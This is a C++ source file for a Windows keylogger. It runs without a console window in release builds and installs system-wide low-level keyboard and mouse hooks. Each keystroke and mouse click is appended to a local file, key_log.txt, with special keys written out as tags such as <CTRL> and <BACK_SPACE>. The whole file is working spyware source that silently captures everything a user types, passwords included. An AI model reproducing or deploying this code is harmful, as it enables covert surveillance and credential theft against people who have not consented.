#include "KeyLogger.h"


HHOOK KbdHook = nullptr;
HHOOK MouseHook = nullptr;

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
#ifndef NDEBUG
    AllocConsole();
    FILE* fDummy;
    freopen_s(&fDummy, "CONIN$", "r", stdin);
    freopen_s(&fDummy, "CONOUT$", "w", stderr);
    freopen_s(&fDummy, "CONOUT$", "w", stdout);
#endif
    

    KbdHook = SetWindowsHookEx(WH_KEYBOARD_LL, &LowLevelKeyboardProc, hInstance, 0);
    if (KbdHook == nullptr)
    {
        WriteToLog("\nError setting keyboard hook\n");
        return EXIT_SUCCESS;

    }
    MouseHook = SetWindowsHookEx(WH_MOUSE_LL, &LowLevelMouseProc, hInstance, 0);
    if (MouseHook == nullptr)
    {
        WriteToLog("\nError setting mouse hook\n");
        return EXIT_SUCCESS;
    }


    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

#ifndef NDEBUG
    FreeConsole();
#endif
    return msg.wParam;
}



LRESULT CALLBACK LowLevelKeyboardProc(
    _In_ int    nCode,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
)
{
    KBDLLHOOKSTRUCT& kbd = *reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

    if ((kbd.flags & LLKHF_UP) == 0)
    {
        WriteToLog(kbd.vkCode);
    }

    return CallNextHookEx(KbdHook, nCode, wParam, lParam);
}



LRESULT CALLBACK LowLevelMouseProc(
    _In_ int    nCode,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
)
{
    //MSLLHOOKSTRUCT& mouse = *reinterpret_cast<MSLLHOOKSTRUCT*>(lParam);
    switch (wParam)
    {
        case WM_LBUTTONDOWN:
            WriteToLog(VK_LBUTTON);
            break;
        case WM_RBUTTONDOWN:
            WriteToLog(VK_RBUTTON);
            break;
    }

    return CallNextHookEx(MouseHook, nCode, wParam, lParam);
}
void WriteToLog(std::string_view str)
{
    std::ofstream logger("key_log.txt", std::ios::app);
    logger << str;
#ifndef NDEBUG
    std::cout << str;
#endif
}

void WriteToLog(DWORD vkCode)
{
    std::ofstream logger("key_log.txt", std::ios::app);
    std::string_view msg;
    switch (vkCode)
    {
        case VK_LBUTTON:
            msg = "<L_CLICK>";
            break;
        case VK_RBUTTON:
            msg = "<R_CLICK>";
            break;
        case VK_BACK:
            msg = "<BACK_SPACE>";
            break;
        case VK_TAB:
            msg = "<TAB>";
            break;
        case VK_RETURN:
            msg = "\n";
            break;
        case VK_SHIFT:
            msg = "<SHIFT>";
            break;
        case VK_CONTROL:
            msg = "<CTRL>";
            break;
        case VK_MENU:
            msg = "<ALT>";
            break;
        case VK_ESCAPE:
            msg = "<ESC>";
            break;
        case VK_SPACE:
            msg = " ";
            break;
        case VK_LSHIFT:
            msg = "<L_SHIFT>";
            break;
        case VK_RSHIFT:
            msg = "<R_SHIFT>";
            break;
        case VK_LCONTROL:
            msg = "<L_CTRL>";
            break;
        case VK_RCONTROL:
            msg = "<R_CTRL>";
            break;
        case VK_LMENU:
            msg = "<L_ALT>";
            break;
        case VK_RMENU:
            msg = "<R_ALT>";
            break;
        default:
#ifndef NDEBUG
            std::cout.put(static_cast<char>(vkCode));
#endif
            logger.put(static_cast<char>(vkCode)); // if it's not a special key
            
            return;
    }
    logger << msg;
#ifndef NDEBUG
    std::cout << msg;
#endif

}